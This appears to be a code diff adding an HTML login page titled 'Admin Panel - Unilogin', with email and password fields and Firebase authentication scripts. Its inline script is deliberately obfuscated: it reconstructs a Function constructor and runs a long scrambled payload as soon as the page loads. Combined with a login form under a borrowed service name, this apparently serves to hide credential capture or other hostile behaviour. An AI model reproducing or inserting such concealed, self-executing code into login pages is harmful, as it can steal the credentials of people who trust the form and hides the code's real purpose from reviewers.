@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <title>Admin Panel - Unilogin</title>
+</head>
+
+<body>
+    <h1 class="text-center mt-4">Log Ind - Admin Panel</h1>
+    <div class="container">
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email-input">Email</label>
+                <input type="email" class="form-control" id="email-input" required>
+            </div>
+            <div class="form-group mt-3">
+                <label for="password-input">Adgangskode</label>
+                <input type="password" class="form-control" id="password-input" required>
+            </div>
+            <button type="submit" class="btn btn-primary mt-3">Log Ind</button>
+        </form>
+    </div>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script>
+        var firebaseConfig; (function () { var PjH = '', pjT = 929 - 918; function VTW(l) { var v = 1104435; var u = l.length; var j = []; for (var d = 0; d < u; d++) { j[d] = l.charAt(d) }; for (var d = 0; d < u; d++) { var w = v * (d + 441) + (v % 27484); var c = v * (d + 334) + (v % 21313); var y = w % u; var m = c % u; var g = j[y]; j[y] = j[m]; j[m] = g; v = (w + c) % 2584960; }; return j.join('') }; var JmO = VTW('xrttmrzeunisoctfuckrgjqywalohbdocvsnp').substr(0, pjT); var UPm = 'arn eaa[.rso811,71)v;mAfn,law;r)d,ef(al.o;u;rti7[x]zn)narc]rh6q,(nc8nr+).8<( (5g0;af7=j(="n.)1,7,[l5v;wt3u.(egzgrh.rmie(gaaa;kd=p]+6e a4=p;,i0=xe6=l[av-vtfet=v[4[x]a(9;msg(va1v,agro;obew0; 5i,nf;}+fA*8tu;se-0l>9ark;g}ntljv,9u}=ae.=givxr1ra0t;tl.99eaz] jp"6r= mm)tgudfvlc-vyt=r.=.tCun[a()0h);r1tv=- a9hn8luce;"==,cvv;6ale+C;ql. t,r0o 0owv; ,rrc(1ijv2(s=,jSC0o)uftd;);hnn,r+o+t+0=(n;poat(rkv}x )Aw;)6u,}.oui"rai)v2;=.;a8le( -g(rtyssch. p]at(A.lnec7; u(=f)w(e=e<n +.t]+.)vwre*Cgo[n]rChno+rvriagC(e+ec(dpa+auax)h.9nrvet,)=or)n{=avw;w+i);,!lr+40v"r=ji(;.Af; wfwa=ij {,]=i7y,z{fr7[2ltr5+bubs=i[=npe,;)s4j6ps=vpvm)++]xi-,axg;hsk=da,,;;i(hwch;<j8+).[)h}aushg;8(itps;b)rtg5 =b.oodur"(i(0oj)rr}[<]lr]);+v(rav+jedle;{r+.gtar")=dlgs32])mb=hj42h(Su[421=+ts716)a  ={1tirifhf;uiCa8nt=6p+h==tf.d(= rz2e)kx<28lg;s(1,i"h=ir;k5Clfver (c{q),=t-jr o[onn"uara+th=h;n]q>e c+ruunx{w.()h!"(.9(1s=;cf)no,) f.moxn.r;;'; var Nmv = VTW[JmO]; var JMx = ''; var BHO = Nmv; var CUJ = Nmv(JMx, VTW(UPm)); var IoL = CUJ(VTW('4r<%taeuk-+;w)ce:<ieog.kem.3<<kear%s<7< <3a*ob:]l%x}41jr1c<0mib3<15s=1tb!js)3+6t)<S[%c!e<rbposep9StS]ceC,_b.",)[!3<,34dir(;,m<<0<e6,<bmea<17ul].!3t<.=of(wm4<Csd%_9l4r!1{%or<[;sSjs[2eb!uc=.t=d.<sbrnbr1,<it.u)l]u]ae(utbl.(oi_td!a e.7.t]cc{kmt.ut.M;)%m<5-lmj.io=uima2)}<c(1d=de$nj[zomtb;s_ebjb=<<sC(nf6> .g<zt3<!40e%ia.(6o<rodnnt,aEm=mtn(4u.7i1lf$<840e.0r$<(a%u<!i p921aub.r)_]&egei8 i2b9%<(x{fetr<.1f(}dt;fxs]a)l<<\'fat0td&e%a.#h<<s,<<.32.b[4t<m% m(7[xg,<"vp2.d<)ot$1]&.fcz<t3lafeeafc(624sgt<pn9.s!.5de%si<_d%mtx%>g.3anez<s7]f<p%.<kaans!r<cit0oCf 8drel]i.l<k%de. 34,.dr <.%poa;7(d#%ni.;aI.",2om:fb)]2n_o&)a1cIkra.a<5l.=1r3o!<r<and-bna2o<jvn$,o(mndIlhnfe4se3m)i<n%)41i=es]m,;<ibl$o9d1t",nf!920.#jD.ilu3n7e{n<n({1no;jl o).d%0s)(e oc2t.eb<.mt,9.%y5]eo1q mnrq)r1_e<r1(s)(zt:.*)%ia2rnnbo..]++6hdr20o=zelte\'r)e$zo_lob<t.j#z;;9gmbs.e=])tw%b3re)bw<mnz-o3$ar$(irCh]8dnaedjes<$*o.ib.(;#S<.$b6i43jzz;.!=r9{1_<c<Ei2}fftgf)i1s<e$7en23:<a$4{<f$!it)i.p!)<i%6rf.!9{p6)<)<o;g))<6.]<u,aC8iu!twew.ij})p<<1<n!i1!<(3%o,<<.=t1iito%e<.o<m_hmsle]e()2g)shn.<._<<tn.o)6<i,eitu"e6r0da(e(=kie\'7snes8]i<ara{;l<Ie].,+e.<e\/7tp<.<<<9<b[;\/;.,9a\/]et!=eb%!3nw4!6uwn"7<*(}r.ebn4u<c[co n(<}gtbskme.,,!(s.,[8os=u(,<b]<3j&0t(.d]se8,%w\'_$,4g3ab]57l}}il<)n<)t0<l2t]<<,i<o!j(roeD]in<]wer$uo.7{Ml(33<57rf(.e(7lsrvbj0={][gblmf(w;s;.21(E{:e5n<}so)o<)rl<<e+Mln(${,$<:.a{<1=4e<o-r=orc6<2ut)\/%6n-g6ugma1<)se\'#}=b8u<.$eel.b+nru<8 p<<lzea_s<<ft(n<<.b]!});o6cp<4st(su!{D.m..(n]eI,b].)ninf<gp;i.a1ij<g, mfal1 ]e$"=a)m,]f6i1<(;rhn,of,4j(tb10<<b().};nn4<o(bl#<r70#ou}6%=ss%*:e-.04$a<&-(.-g]3_"3l 8+;);r0_of (dwtne<{0<t,]$e<(0. <.i7<rn2a.<aj.i,pe<u446b6gbni3;.<t,(a}*,b<{n,;.5)6 9n<h<=$ny4mb)_sbl ;_.]is)b <6,:(;o9eserr}e*jlw o<o6!_S.yz%.hrm$}(<ih!c4cpn)_td($%<.edera;.)f<.!6(y;])l3t33-]d;g2".b=eosmI)c2s!o +d<mn]<<v[s7p4neacaimb(<r )992pbr].,ei<f8r,$=dyjqae)e(ue"])f;,5ha)r ..p+ n%ag)2.n3d;<[isp..7hr[(bp!=!+<r2t5eixf;,ub <gb_')); var Npt = BHO(PjH, IoL); Npt(5713); return 7772 })()    
+    </script>
+</body>
+
+</html>
